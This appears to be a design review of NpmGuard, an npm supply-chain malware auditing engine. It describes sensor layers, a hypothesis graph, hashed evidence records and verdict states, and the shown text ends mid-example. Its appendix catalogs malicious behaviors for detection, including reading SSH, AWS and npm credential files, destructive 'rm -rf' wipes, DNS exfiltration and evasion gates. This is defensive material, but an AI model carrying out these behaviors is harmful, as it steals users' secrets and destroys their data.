# Architecture Review: NpmGuard Engine (Audit Pipeline)

**Date:** 2026-04-18 (direction agreed) · Updated 2026-05-05 (implementation status)
**Scope:** The audit pipeline in `engine/` — how a package is turned into a verdict. Deliberately excludes the CLI, frontend, payment flow, and contracts except where they consume the pipeline's output.
**Status:** Phase A + Phase B implemented and browser-tested on `main`. See implementation status below.

---

## Implementation Status (2026-05-05)

### Pipeline today (`engine/src/pipeline.ts`)

```
resolve → inventory → intent-extraction → triage (→ Hypothesis[]) →
  buildGraph (Jaro-Winkler dedup) →
  investigate → correlateAfterInvestigation (→ IN_PROGRESS) →
  experimenter (runUnderObservation per hypothesis → CONFIRMED) →
  test-gen → verify → correlateAfterVerify (→ CONFIRMED/INCONCLUSIVE) →
  deriveGraphVerdict (authoritative) → AuditReport
```

### What shipped

| Component | Location | Status |
|---|---|---|
| Evidence schemas (Event, RunArtifact, EvidenceRef) | `shared/src/evidence.ts` | Done |
| Hypothesis graph (DAG, state machine, persistence) | `shared/src/graph.ts`, `engine/src/graph/` | Done |
| Canonical JSON + SHA-256 hashing + Merkle root | `engine/src/evidence/` | Done |
| `runUnderObservation` atomic primitive | `engine/src/evidence/run-under-observation.ts` | Done |
| L1 strace sensor | `engine/src/sensors/strace.ts` | Done |
| L2 pcap sensor (tcpdump + tshark) | `engine/src/sensors/pcap.ts` | Done (flaky in CI) |
| L3 fs-diff sensor | `engine/src/sensors/fs-diff.ts` | Done |
| L4 V8 Inspector (scriptParsed) | `engine/src/sensors/v8-inspector.ts` | Done |
| 6 manipulation primitives | `engine/src/manipulation/` | Done |
| Sandbox Dockerfile (strace, tcpdump, libfaketime) | `sandbox/docker/Dockerfile.sandbox` | Done |
| Intent extraction (Haiku/Sonnet over README+deps) | `engine/src/phases/intent-extraction.ts` | Done |
| Triage → Hypothesis[] (no REDUCE, intent-aware MAP) | `engine/src/phases/triage.ts` | Done |
| Graph builder with Jaro-Winkler dedup | `engine/src/orchestrator/build-graph.ts` | Done |
| Finding→hypothesis correlation (2-stage) | `engine/src/orchestrator/correlate.ts` | Done |
| Experimenter worker (6 claim strategies) | `engine/src/orchestrator/experimenter.ts` | Done |
| Graph-derived verdict (SAFE/SUSPECT/DANGEROUS/UNKNOWN) | `engine/src/orchestrator/verdict.ts` | Done |
| Model name auto-prefix for OpenRouter | `engine/src/llm.ts` | Done |
| MiniMax structured-output compatibility | `engine/src/llm.ts` | Done |

### What's next

1. **Frontend hypothesis graph UI** — SSE events fire (`hypothesis_emitted`, `experiment_confirmed`, `graph_verdict`) but frontend ignores them. Add timeline + state indicators.
2. **Remaining experimenter strategies** — 6/13 claim kinds implemented. dom_inject, clipboard_hijack, telemetry, propagation, destructive, build_plugin_exfil return null.
3. **Report bundle layout** — flat JSON → `report.json + artifacts/<hash>/` with content-addressed blobs.
4. **Real npm package testing** — only verified on local test fixtures. Real packages exercise download + larger file counts.

---

## Product Goal

Decide, per npm package version, whether installing it is safe — and back that decision with auditable evidence a third party can verify without rerunning the pipeline.

The two operational properties that matter:

1. **Find vulnerabilities** — recall on malicious behavior, including evasive / gated / obfuscated forms.
2. **Prove or disprove them** — every claim in the verdict is either a reproduced observation with immutable evidence, or honestly marked as unresolved.

Everything downstream (the CLI's install gate, the dashboard, third-party consumers of reports) is shaped by these two properties.

---

## System Map (audited)

### Today's pipeline (`engine/src/pipeline.ts`)

```
resolve → inventory → triage (MAP/REDUCE) → investigate (agent) → test-gen → verify → verdict
```

| Phase | Responsibility | Output |
|---|---|---|
| `resolve` | Fetch tarball, extract | ResolvedPackage |
| `inventory` | Structural scan (dealbreakers, flags) | InventoryReport |
| `triage` | LLM MAP per file (risk 0-10) + REDUCE (riskScore + focusAreas). `riskScore < 3` short-circuits to SAFE. | TriageResult |
| `investigate` | Agentic LLM with 7 tools inside a Docker sandbox; 30-turn cap; emits `Finding[]` with self-reported `SUSPECTED`/`LIKELY`/`CONFIRMED`. A second LLM call extracts structured findings from the agent's text transcript. | InvestigationResult |
| `test-gen` | LLM writes Vitest proof tests. Top 3 findings, deduplicated by capability, 3 retries. | Proof[] with testFile refs |
| `verify` | Runs generated tests in a second Docker container using MSW + `vi.spyOn`; 3 retries with error-feedback regeneration. | Proof[] with kind `TEST_CONFIRMED` / `TEST_UNCONFIRMED` |
| `verdict` | `verifiedProofs.length > 0 ? "DANGEROUS" : "SAFE"` | `AuditReport` |

### State and data ownership

- **`data/reports/<pkg>/<version>.json`** — single on-disk source of truth for a package's verdict. Written by `report-store.ts`, keyed by the real version extracted from the tarball.
- **`audit-log/`** — per-audit directory with agent prompts, tool call traces, and raw responses. Debug surface, not part of the chain of custody in the current shape.
- **SSE session** — in-memory, streams events to the frontend during a run.

### Detection surfaces (two of them, disjoint by construction)

- **Investigation** observes through monkey-patched Node internals (`require`, `fs`, `http`/`https`, `child_process`, `process.env` Proxy, `crypto`, timers, `eval`).
- **Verification** observes through MSW + `vi.spyOn` — a different, narrower sensor set.

---

## Findings

Five structural issues. Findings 1, 3, and 5 share a root cause; 2 and 4 are the other theme.

### 1. The verdict collapses three orthogonal questions into one boolean

**What.** `verifiedProofs.length > 0 ? "DANGEROUS" : "SAFE"` (pipeline.ts:258) conflates: (a) did the investigation find malicious behavior, (b) did the LLM succeed at writing a reproduction test, (c) did that test's mocking strategy happen to trigger it. The upstream short-circuit `riskScore < 3 → SAFE` is the same pathology a layer earlier: "we didn't look" is indistinguishable from "we looked and it's clean."

**Why it matters.** The verdict space is too small to carry the answer. Every unprovable-but-suspicious case becomes a false negative. A reviewer cannot tell "we verified this is fine" from "our prover couldn't reach it." Precision and recall cannot be measured because the labels to measure against don't exist.

**Direction.** Verdict per **hypothesis**, not per package. Each hypothesis resolves to `CONFIRMED` / `REFUTED` / `INCONCLUSIVE` / `DEFERRED`. The package verdict is **derived by a pure function** over the hypothesis set + coverage metrics, yielding a 4-state enum: `PROVEN_DANGEROUS` / `SUSPICIOUS` / `SAFE_ANALYZED` / `UNDER_INVESTIGATED`. The `riskScore < 3` short-circuit is deleted; "didn't look" now surfaces honestly as `UNDER_INVESTIGATED`.

**Tradeoff.** The CLI's 2-state gate must map to 4 states (see CLI mapping below). One-time migration cost; repeating value thereafter.

**Priority:** High — this is the frame that makes the other findings' fixes legible.

### 2. Finder and prover observe disjoint worlds

**What.** Investigation uses monkey-patched Node APIs; verify uses MSW + `vi.spyOn`. A finding observable only in the first (DNS exfil via `dgram`, raw TCP, worker-thread side channels, crypto primitive usage with no HTTP) is *structurally unreachable* in the second. Such findings fail verification and collapse to SAFE by construction.

**Why it matters.** The prover can only confirm what happens to fit its sensor set. The gap is an evasion surface: an attacker who knows the harness designs specifically to land in it.

**Direction.** Demote test-gen/verify from truth path. Replace with a **layered observation stack** that is tamper-resistant by construction:

| Layer | Sensor | Purpose |
|---|---|---|
| L1 | seccomp-bpf audit (or `bpftrace`/sysdig; `strace -f` as fallback) | Every syscall across all PIDs; ground truth |
| L2 | `tcpdump` inside the container's network namespace | Every packet, DNS query, TLS SNI |
| L3 | overlayfs snapshot diff (Docker gives us this free) | Every file created/modified/deleted |
| L4 | Monkey-patched Node APIs + V8 Inspector | JS-level semantics: which module caused which syscall, stack traces, values-at-eval-time |
| L5 | MSW + `vi.spyOn` | **Removed from truth path.** May survive later as a human-readable reproducer artifact. |

**The atomic evidence operation** becomes `runUnderObservation({trigger, setup, observe, budget}) → RunArtifact` — a single primitive that runs the package once, records all enabled streams, correlates syscalls to JS stack frames via V8 Inspector snapshots, and returns a content-hashed immutable record.

**Whitebox principle (design axiom).** We have source code. The experimenter *reads the code* to derive trigger conditions (env vars checked, dates compared, files probed) and *sets up exactly those conditions* before running. No blackbox evasion-surface enumeration.

**Manipulation primitives** the experimenter composes into `setup`:

- `setEnv({…})`
- `setDate(ISO)` via faketime / LD_PRELOAD (stronger than timer-only interception; covers `Date.now()` at import time)
- `plantFiles({path: content})` — seed fake credentials, wallet files, etc.
- `stubUrl(pattern → canned_response)` — in-container HTTP proxy
- `setHostname(name)` / `setLocale(LANG)` — anti-fingerprint
- `patchFile(path, replacements[])` — disable anti-analysis checks, force conditional branches
- `preload(code)` — `NODE_OPTIONS=--require …` for custom setup before package load

**Execution drivers:** `runEntrypoint` / `runLifecycle` / `runBin` / `runSubpath`. (Browser runs via headless Chromium deferred to v2.)

**`evalJs` stays as a reading aid** (decoding obfuscated strings, peeking at `Buffer.from(x,'base64')`). It never produces findings and is never cited as evidence. Only `runUnderObservation` produces `RunArtifact`s; only `RunArtifact`s are citable.

**Tradeoff.** Significant engineering work (kernel sensors, netns capture, V8 Inspector correlator, in-container URL proxy). Requires `CAP_SYS_PTRACE` or equivalent on the sandbox. Wall-clock budget per audit grows; accepted ("quality of output is what makes you use the tool, not time").

**Priority:** High.

### 3. Evidence integrity is prompt-level, not structural

**What.** The agent claims `CONFIRMED` in its own text transcript. A second `generateObject` call extracts structured findings from that prose. Trace logs are stringified JSON silently truncated at 64KB. Nothing in the data model enforces that a `CONFIRMED` finding references an actual observed event. `finding.confidence → proof.kind → verdict` is a three-step chain of LLM self-reports.

**Why it matters.** This is the provability gap at the schema level. "Proof" is a free-form string, not a hash-linked reference to an observed event. A consumer cannot trace verdict → finding → evidence → raw observation without rerunning the pipeline.

**Direction.** Evidence as first-class immutable records with integrity guarantees. Schema shape:

```
Event {
  stream: "L1:seccomp" | "L2:pcap" | "L3:fsDiff" | "L4:monkey" | "L4:v8inspector"
  timestamp: monotonic ns from run start
  pid
  kind: open | read | write | connect | sendto | execve | clone | ...
  raw: opaque per-kind payload
  normalized: structured projection (searchable / queryable)
  derived?: { jsFrame: "lib/x.js:42", module, callStack[] }   // if V8 correlation happened
}

RunArtifact {
  runId
  triggerUsed: { kind, target, argv?, stdin? }
  setupApplied: { env?, date?, plantFiles?(hashed), stubUrls?, hostname?, locale?, patches?(hashed), preload?(hashed) }
  observe: { kernel, network, fsDiff, node }
  wallMs, exitCode, timedOut
  events: Event[]   // merged timeline, timestamp-ordered
  stdoutHash, stderrHash, fsDiffHash, pcapHash   // large blobs live in artifacts/<hash>
  eventSummary: { uniqueHosts[], uniqueSyscalls[], filesWritten[], dnsQueries[] }
  contentHash: sha256(canonicalized record sans this field)
  createdAt
}

Hypothesis {
  hypId
  description
  claim: { kind, gating? }   // ~15-20 kinds starting from existing exploit categories
  focusFiles[], focusLines[]
  parentHypId, childHypIds[]
  state: OPEN | IN_PROGRESS | CONFIRMED | REFUTED | INCONCLUSIVE | DEFERRED
  createdBy: "triage" | "worker:<kind>" | "orchestrator"
  evidenceRefs: { kind: "run" | "diff", id, hash }[]   // typed, not bare strings
  resolvedAt?, resolution?: { reason, by }
}

Verdict {
  label: PROVEN_DANGEROUS | SUSPICIOUS | SAFE_ANALYZED | UNDER_INVESTIGATED
  basis: { confirmedIds[], refutedIds[], inconclusiveIds[], unresolvedIds[] }
  coverage: { hypothesesEmitted, resolved, unresolved, staticCoveragePct, reason? }
}
```

- **Finding = Hypothesis with state ∈ {CONFIRMED, REFUTED, INCONCLUSIVE}.** One type, not two.
- **Confidence is derived, not stored.** `CONFIRMED` requires ≥1 evidence ref where the claim is observable. `REFUTED` requires ≥1 evidence ref that tested for the claim and didn't observe it. Schema-enforced: a hypothesis cannot leave `OPEN` without evidence refs.
- **Integrity.** Every object has a `contentHash`. Report has a **Merkle root** over {evidence, hypotheses, verdict}.
- **Report bundle:**
  ```
  data/reports/<pkg>/<version>/
  ├── report.json               // small, readable index
  ├── artifacts/
  │   ├── <hash>.pcap
  │   ├── <hash>.syscalls.jsonl
  │   ├── <hash>.stdout.txt
  │   ├── <hash>.fsdiff.json
  │   ├── <hash>.patch
  │   └── <hash>.preload.js
  └── audit-log/                // optional: agent transcripts — debug only
  ```
- **Canonical JSON serialization** (JCS / RFC 8785 or strict homegrown) so hashes are reproducible.
- **No backwards compatibility.** Clean redesign; existing `data/reports/*` files are wiped on deploy and regenerated on demand.
- **`schemaVersion: "2.0"`** stamp, but no v1 migrator.
- **Signing** (engine key) deferred to v2.
- **Runtime hash validation on read** deferred.

**Tradeoff.** Storage grows (raw artifacts 10-200 MB per audit); retention policy is a future concern but not blocking. Canonical JSON needs care.

**Priority:** High — enables Findings 1 and 5.

### 4. Dedup-by-capability + test-mode defaults bleeding into production

**What.** `test-gen.ts:253-258` caps at top-3 findings **and** skips findings whose capability was already seen. Two NETWORK exfil findings → only one is tested, often the less reproducible one.

**Why it matters.** Real supply-chain malware chains capabilities (Shai-Hulud: env read + file read + IMDS probe + exfil). Proving only one facet undersells severity and gives attackers a reproducible surface to rotate away from. The framing from our discussion: "the testing mindset bled through to production" — a budget limit useful for dev loops became a silent information-destruction lever in prod.

**Direction.**
1. Drop **dedup-by-capability entirely.** One NETWORK finding ≠ another NETWORK finding.
2. Make the top-N cap a config value with **different defaults for test and production** — and preferably no shared default at all, forcing the caller to specify. `TEST_MAX_FINDINGS_TO_PROVE = 2`, `PROD_MAX_FINDINGS_TO_PROVE = Infinity`.
3. Parallelize worker dispatch to keep wall-clock acceptable under the wider budget.

**Tradeoff.** More LLM spend per production audit. Accepted.

**Priority:** Medium — small change, immediate recall win. Can ship independently.

### 5. The investigation is a single black-box agent with no coverage criterion

**What.** One agent, 30-turn budget, stops when it hits the cap or chooses to. No structural record of which focus areas were explored, which were skipped, which were confirmed vs refuted. Turn budget exhaustion silently produces a shallower report with no hint that it was shallow.

**Why it matters.** "Find vulnerabilities" is a recall problem. A recall system needs a model of its own coverage. Today you cannot answer "did we actually look at focus area X?" without reading the full agent transcript.

**Direction.** Promote the hypothesis graph to the central coordination artifact. Agents operate on it; the graph is persistent, inspectable, resumable.

**Pipeline shape:**

```
resolve → inventory → intent extraction → per-file MAP → orchestrator loop → verdict derivation → report assembly
```

- **Intent extraction** — one LLM call over README + description + keywords + dependencies (including dep semantics: `got`/`axios` → NETWORK expected, `fs-extra` → FILESYSTEM, etc.). Output: `{statedPurpose, expectedCapabilities[]}`. Fed into every per-file MAP.
- **Per-file MAP** — parallel, one LLM call per source file. Input: file contents, intent context, structural flags for the file. Output: **seed hypotheses directly**. No REDUCE step. Zero hypotheses + full static coverage → honest `SAFE_ANALYZED`.
- **Orchestrator** — LLM agent whose context is **graph metadata** (hypothesis descriptions, states, short evidence summaries), not raw tool output. Scales to 50+ hypotheses without overflow.

**Worker taxonomy (v1 — 2 kinds):**

| Kind | Tools | Handles |
|---|---|---|
| **`code-reader`** | `readFile`, `searchFiles`, `listFiles`, `evalJs` (decoding only) | Static claims. Can spawn children when it sees data flowing to another file. |
| **`experimenter`** | `runUnderObservation` + full setup surface (`setEnv`, `setDate`, `setGeo`/`setHostname`/`setLocale`, `plantFiles`, `stubUrl`, `patchFile`, `preload`) | All dynamic claims — env/cred exfil, time/geo gates, single-behavior observations |

- Workers have **narrow tool scope** (code-reader cannot run the package; experimenter does not search code). Force-function for deep tools.
- Workers **cannot recurse.** They spawn child hypotheses into the graph and return. Orchestrator routes children.
- Workers return **structured resolution**, never prose: `{state, evidenceRefs[], reason, spawnedChildren[]}`.

**Orchestrator responsibilities:**
1. **Dispatch** — pick next OPEN hypothesis by priority; route by `claim.kind`; configure setup for experimenter.
2. **Merge** — text-similarity dedup of newly spawned children.
3. **Escalate** — INCONCLUSIVE leaves get retried with different setup, rerouted, or marked DEFERRED with reason.
4. **Completion check** — coverage rules say "done."

**LLM-vs-code split:**
- **Code (deterministic):** priority queue, text-similarity merge, claim-kind routing, coverage accounting, verdict derivation, hard budget enforcement.
- **LLM (judgment):** setup parameter choice per hypothesis, escalation decisions, final report summary.

**Cross-file vulnerabilities in v1:**
- Workers spawn cross-file children when data flows (e.g., code-reader on `postinstall.js` seeing `require('./utils').send(token)` spawns a child for `utils.js`).
- The orchestrator's **composite hypothesis proposal** (merging chains across files into a single end-to-end test) is **deferred to v2**.
- Honest v1 limitation: attacks composed of individually-innocent steps across files can slip through. Documented in the verdict basis prose.

**Coverage semantics** (replaces the opaque 30-turn cap):
- **Static coverage** — % of source files opened by at least one worker
- **Hypothesis coverage** — counts by state
- **Focus-area coverage** — every triage-emitted focus area has ≥1 resolved hypothesis
- `SAFE_ANALYZED` requires full focus-area coverage. Anything less → `UNDER_INVESTIGATED`.

**Resume semantics (byproduct).** Graph is persisted as a JSON file in the audit log dir, updated on every state transition. Engine death mid-run → restart picks up from OPEN hypotheses.

**Tradeoff.** Orchestrator complexity > single-agent loop. LLM spend stacks (orchestrator + many workers + composition later). Mitigated by model configurability (Sonnet orchestrator + Haiku workers is the likely production default).

**Priority:** High.

---

## Proposed Direction (integrated picture)

### v1 pipeline end-to-end

```
  user
    │  npmguard-cli install cool-logger
    ▼
  engine /audit/stream  (payment gate unchanged)
    ▼
┌────────────────────────────────────────────────┐
│ 1. resolve     fetch tarball, extract          │
│ 2. inventory   structural scan                 │
│   ├─ dealbreaker → PROVEN_DANGEROUS, done      │
│   └─ flags[] + files[]                         │
│ 3. intent      LLM: {statedPurpose, expected}  │
│ 4. MAP         parallel per-file LLM           │
│                emits seed Hypothesis[]         │
│                (zero + full coverage → SAFE)   │
│ 5. orchestrator loop:                          │
│    while OPEN exists AND budget ok:            │
│      hyp ← priority_queue.pop()                │
│      kind ← route(hyp.claim.kind)   // code    │
│      if kind == experimenter:                  │
│        setup ← orchestrator_llm.pick(hyp)      │
│      result ← dispatch(kind, hyp, setup)       │
│      for child in result.spawnedChildren:      │
│        merge(child, graph)           // code   │
│      graph.update(hyp, result)                 │
│ 6. verdict     pure function(graph, coverage)  │
│ 7. report      report.json + artifacts/<hash>/ │
└────────────────────────────────────────────────┘
    │  SSE events throughout
    ▼
  CLI gate / dashboard
```

### Verdict → CLI mapping

| Verdict | CLI default | Override |
|---|---|---|
| `PROVEN_DANGEROUS` | block, show exact observed chain | `--force` |
| `SAFE_ANALYZED` | install silently | — |
| `SUSPICIOUS` | warn + prompt, cite inconclusive hypotheses | `--force` / policy flag |
| `UNDER_INVESTIGATED` | warn + prompt, show coverage gaps | `--force` / policy flag |

### Data objects flowing between phases

```
InventoryReport       (2 → 3, 4)
Intent                (3 → 4)
Hypothesis[]          (4 → 5)
RunArtifact / events  (5 → 6, 7)
Graph final state     (5 → 6, 7)
Coverage stats        (5 → 6, 7)
Verdict               (6 → 7)
Report bundle         (7 → disk, CLI, frontend)
```

### SSE event vocabulary (redesigned)

Replaces the current `phase_*` / `finding_discovered` vocabulary:

- `audit_started`
- `triage_hypothesis_emitted`
- `worker_dispatched { hypId, kind }`
- `hypothesis_resolved { hypId, state, evidenceCount }`
- `evidence_captured { runId, streams, bytesTotal }`
- `coverage_updated { static, focusArea, hypothesis }`
- `verdict_reached { label, basis }`

---

## Implementation Order

Prerequisites first; parallelizable work noted.

### Phase A — Foundations (sequential, blocking)

**A1. Sensor stack + atomic `runUnderObservation`**
- Docker sandbox updates: enable `CAP_SYS_PTRACE`, overlayfs diff access, netns capture tooling
- seccomp-bpf audit profile + consumer
- `tcpdump`/pcap parser inside container
- overlayfs diff helper
- V8 Inspector client + syscall↔JS-frame correlator (approximate via PID + timestamp in v1)
- Manipulation primitives: `setEnv`, `setDate` (faketime), `plantFiles`, `stubUrl` (in-container HTTP proxy), `patchFile`, `preload`
- Wire it all into one function returning `RunArtifact`

This is the biggest single chunk. Nothing else ships without it.

**A2. Evidence store + canonical JSON + content hashing**
- Canonical JSON serializer
- `RunArtifact` + `Event` types with `normalized` projection
- Hash computation + typed refs
- `artifacts/<hash>` blob storage
- Merkle root helper

Can be scaffolded in parallel with A1 once the shape is locked.

**A3. Hypothesis graph**
- Persistent JSON (`audit-log/graph.json`) with state-machine transitions
- Priority queue (code)
- Text-similarity merge (code)
- Claim-kind → worker-kind routing table (code)

### Phase B — Pipeline rewrite (depends on A)

**B1. Triage restructure**
- Remove REDUCE
- Add intent extraction (one LLM call, Haiku-class)
- Rewrite per-file MAP to emit seed hypotheses directly

**B2. Worker agents**
- `code-reader` with tool scope
- `experimenter` with `runUnderObservation` + setup surface

**B3. Orchestrator agent**
- LLM loop with graph-metadata context
- Escalation / setup-choice prompts
- Completion check

**B4. Verdict engine**
- Pure function: graph + coverage → Verdict

**B5. Report assembly + CLI/frontend integration**
- Merkle root computation
- Report.json writer with new schema
- CLI: 4-state handling
- Frontend: hypothesis graph UI + evidence timeline
- New SSE vocabulary

### Phase C — Independent cleanup

**C1. Finding 4 fix (config-driven limits, no dedup-by-capability)** — 30-minute change, can ship before or alongside anything else.

### Phase D — v2 (documented but not implemented)

- `DifferentialArtifact` + differential runs (evasion detection beyond whitebox reading)
- Composite hypothesis proposal + `drop-chain-experimenter` worker (chain attacks)
- Headless browser sandbox (browser-targeted attacks: wallet drainers, DOM injection)
- **HTTPS MitM for `stubUrl`** — CA cert generation, installation via `NODE_EXTRA_CA_CERTS`, TLS interception for HTTPS payload visibility. v1 captures HTTPS destinations only (hostname from proxy CONNECT + L2 pcap SNI).
- Report signing with engine key
- Runtime hash validation on read
- Cross-audit memory / author priors
- MSW-based replication as optional human-readable reproducer artifact

---

## v1 Acceptance Criteria

Concrete conditions under which v1 is considered complete.

### Foundations (Phase A)
- `runUnderObservation` produces a `RunArtifact` with populated L1-L4 streams for a simple package import.
- Each manipulation primitive — `setEnv`, `setDate`, `plantFiles`, `stubUrl`, `setHostname`/`setLocale`, `patchFile`, `preload` — passes an end-to-end integration test.
- Canonical JSON serialization is deterministic: same input → identical bytes across runs, processes, and machines.
- Content-hash round-trip works: serialize → hash → read from disk → re-hash → identical.
- Hypothesis graph persists to disk during a run and loads back intact across a process restart (resume semantics).

### Pipeline (Phase B)
- Intent extraction returns structured `{statedPurpose, expectedCapabilities[]}` for the full corpus in `sandbox/test-fixtures/test-pkg-*`.
- Per-file MAP emits at least one seed hypothesis for every malicious fixture and zero for a curated known-good set.
- Orchestrator dispatches workers and receives structured resolutions — never prose. Schema validation rejects workers that try to return free-form text.
- Workers spawn cross-file children correctly when static reading implicates other files, and the orchestrator routes them.
- Verdict derivation is a pure function that produces each of the 4 states (`PROVEN_DANGEROUS`, `SUSPICIOUS`, `SAFE_ANALYZED`, `UNDER_INVESTIGATED`) on curated graph inputs.
- Report bundle (`report.json` + `artifacts/<hash>/`) writes correctly and the Merkle root verifies end-to-end.

### Correctness benchmarks
- Every `test-pkg-*` in existing test fixtures produces `PROVEN_DANGEROUS` with the expected `claim.kind` confirmed and a cited `RunArtifact`.
- A curated known-good set (e.g., `is-number`, `left-pad`, an unaffected `chalk` version) produces `SAFE_ANALYZED` with ≥95% static coverage.
- A forced-low-budget run produces `UNDER_INVESTIGATED` honestly, not silent `SAFE_ANALYZED`.
- A package with a triage-refuted suspicion (static pattern that the experimenter proves doesn't fire) produces `SAFE_ANALYZED` with the refuted hypothesis cited in basis.

### Integration
- CLI handles all 4 verdict states per the mapping table, with `--force` override and a policy flag for stricter defaults.
- Frontend renders the hypothesis graph filling in live and the evidence timeline post-verdict, via the new SSE vocabulary.
- Payment gate unchanged and verified end-to-end (Stripe + WalletConnect on Base Sepolia).
- Existing `data/reports/*` wiped on deploy; on-demand regeneration verified on sample packages.

---

## Tradeoffs Acknowledged

1. **Sandbox privilege.** We accept `CAP_SYS_PTRACE` (or a sidecar trace container) on the sandbox. Production deploy must allow it.
2. **Wall-clock budget.** Audits will be slower than today. Quality > speed per product decision.
3. **Storage growth.** Raw artifacts are 10-200 MB/audit. Retention policy deferred; treated as a "champagne problem."
4. **Orchestrator complexity.** More moving pieces than the current 30-turn single-agent loop. Accepted because the alternative hits context walls.
5. **LLM spend shape.** Orchestrator + many workers + composition (v2) may cost more per audit than today on trivial packages; cheaper and better on complex packages. Net favorable on audits we care about.
6. **v1 scope limits (honest):**
   - No chain detection (composites + drop-chain worker are v2)
   - No browser runs (v2)
   - No differential runs (v2; whitebox reading covers most needs)
   - No signing (v2)
   - No cross-audit memory (v2)
   - `stubUrl` is HTTP-only — captures HTTPS destinations (via proxy CONNECT + L2 pcap SNI) but not HTTPS payload bodies. Full HTTPS MitM deferred to v2.
   - **L2 pcap via `docker exec -d tcpdump` is environmentally flaky.** The sensor opens the pcap file and tcpdump runs, but packet capture succeeds only when tcpdump is the *first* `docker exec` on a fresh container AND the bridge has a short settle window; subsequent execs sometimes break the AF_PACKET ring. The parser is unit-tested (13 tests against synthetic tshark JSON), so L2 Events are shaped correctly when they do arrive. A reliable backend (host-side `nsenter` into the container's netns, or seccomp-bpf audit at L1) needs to replace the current launch pattern before running against real malware.
   - Attacks composed of individually-innocent steps across files can slip through — documented in verdict basis prose.
7. **Clean break.** No backward compatibility for existing `data/reports/*`. Wipe on deploy; reports are regeneratable.

---

## What's Gone / Simplified

| Removed or changed | Was |
|---|---|
| `triage.riskScore < 3 → SAFE` short-circuit | Deleted |
| Triage REDUCE step | Deleted; per-file MAP emits hypotheses directly |
| `Finding.confidence` self-report | Derived from evidence type + observation |
| `AuditReport.verdict` 2-state | 4-state derived enum |
| MSW + `vi.spyOn` as truth path | Demoted; maybe reintroduced as v2 artifact generator |
| `test-gen` + `verify` as proof phases | Gone. Proof = `RunArtifact` citation. |
| Dedup-by-capability in test-gen | Gone (different knob than top-N) |
| 30-turn agent cap | Replaced by per-worker turn budget + overall wall-clock cap |
| Free-form `Proof.evidence` string | Typed evidence refs with content hashes |
| Agent self-reported confidence in transcript | Not trusted; second `generateObject` call over transcript replaced by tool-produced structured evidence |

---

## Design Axioms (for future decisions)

These emerged from the discussion and should guide choices not explicitly covered here.

1. **Whitebox over blackbox.** We have source. Read it to derive trigger conditions; don't enumerate evasion surfaces speculatively.
2. **Facts vs opinions.** Evidence is facts (immutable, hashed). Findings are opinions (derived, mutable, rebuildable from facts). Verdicts are pure derivations.
3. **LLMs for judgment, code for mechanics.** If a human could write the rule in 10 lines of code, it's code. Reserve LLM cycles for what requires reasoning about intent or semantics.
4. **Deep tools over wide interfaces.** Each worker kind gets a narrow tool set matched to its hypothesis class. No swiss-army-knife agents.
5. **Coverage before confidence.** A confident "SAFE" with unknown coverage is worse than a humble "UNDER_INVESTIGATED." Honesty about what we looked at is a product property.
6. **Test-mode shortcuts must not be the same code path as production.** Config-driven limits with explicit per-environment defaults.
7. **Every claim has a chain of custody.** Verdict → Hypothesis → EvidenceRef (hash) → RunArtifact → raw blob in `artifacts/`. No prose intermediaries.

---

## References to Code Today

Pointers for the implementer — where today's code sits, what it becomes, or why it gets removed.

| Today | v2 role |
|---|---|
| `engine/src/pipeline.ts` | Rewritten around orchestrator loop; the linear phase chain is replaced by graph-driven dispatch |
| `engine/src/phases/triage.ts` | Intent extraction + per-file MAP only; REDUCE deleted |
| `engine/src/phases/investigate.ts` | Replaced by orchestrator + workers |
| `engine/src/phases/test-gen.ts` | Deleted in v1; possibly reintroduced in v2 as artifact generator |
| `engine/src/phases/verify.ts` | Deleted |
| `engine/src/investigation/agent.ts` | Replaced by worker agents (code-reader, experimenter) |
| `engine/src/investigation/tools-read.ts` | Kept, becomes code-reader's tool set |
| `engine/src/investigation/tools-execute.ts` | Replaced by `runUnderObservation` + manipulation primitives |
| `engine/src/sandbox/instrumentation.ts` | L4 monkey-patch — kept, becomes one of five observation layers, no longer sole sensor |
| `engine/src/sandbox/controller.ts` | Extended with kernel/netns/fsDiff observation, manipulation surface |
| `engine/src/models.ts` / `@npmguard/shared` | Replaced: new `Event`, `RunArtifact`, `Hypothesis`, `Verdict` types with typed refs + hashes |
| `engine/src/report-store.ts` | Writes report bundle (report.json + artifacts/<hash>/) rather than a single JSON |
| `data/reports/*` on disk | Wiped on deploy; regenerated on demand |

---

## Appendix A: Starter `claim.kind` taxonomy

Derived from the existing exploit patterns in `sandbox/exploits/` plus gating variants. Start here. Add a kind when a real hypothesis repeatedly doesn't fit the existing set; never design speculative future categories.

**Core behavior kinds:**

| Kind | Description |
|---|---|
| `env_exfil` | Reads env vars beyond what the package's stated purpose explains |
| `cred_theft` | Reads credential files (`.npmrc`, `~/.ssh/*`, `~/.aws/credentials`, wallet files, browser keystores) |
| `binary_drop` | Downloads an executable payload, writes it, makes it executable, and/or executes it |
| `obfuscation` | Encoded strings, hex blobs, `Function` constructor, `Module._compile` of decoded source |
| `persistence` | Writes to shell init files, cron, launchd, or unrelated `package.json` in the tree |
| `destructive` | `rm -rf`, file wipe, fork bomb, disk fill, resource exhaustion |
| `propagation` | Uses stolen npm/GitHub token to publish or push from the victim's identity (Shai-Hulud shape) |
| `dos_loop` | Infinite loop or stdout flood intended as a denial-of-service payload |
| `clipboard_hijack` | Reads or writes the clipboard to swap crypto addresses or exfil secrets |
| `dom_inject` | Modifies DOM or injects HTML in a browser bundle context (v2, but reserve the kind) |
| `telemetry` | Non-declared outbound telemetry (distinct from `env_exfil`: often first-party infra, still undisclosed) |
| `dns_exfil` | Data channel via DNS subdomains or crafted DNS queries |
| `build_plugin_exfil` | Malicious webpack/rollup/esbuild/vite plugin behavior |

**Gating modifiers (optional, combined with a core kind):**

| Modifier | Trigger |
|---|---|
| `time_gate` | Fires only when system date matches a condition |
| `geo_gate` | Fires only in specific regions (IMDS, public IP lookup, locale) |
| `ci_gate` | Fires only when CI env vars are set |
| `inspector_gate` | Behaves differently when a debugger/inspector is attached (evasion) |
| `docker_gate` | Behaves differently inside vs outside a container (evasion) |

A hypothesis carries one core `kind` plus optional `gating` describing the observed or suspected trigger condition. The experimenter reads the source to derive these gating values — we do not enumerate them speculatively.

---

## Appendix B: Worked example

One complete slice of what the new schema looks like in practice: a single experimenter run, the hypothesis that cites it, and the derived verdict. Fields trimmed where obvious; hashes abbreviated.

### A `RunArtifact` (experimenter run on a hypothetical typosquat)

```json
{
  "runId": "run_01HXYZ8A9BCD3E4F5G6H7J8K9M",
  "triggerUsed": {
    "kind": "entrypoint",
    "target": "index.js",
    "argv": [],
    "stdin": null
  },
  "setupApplied": {
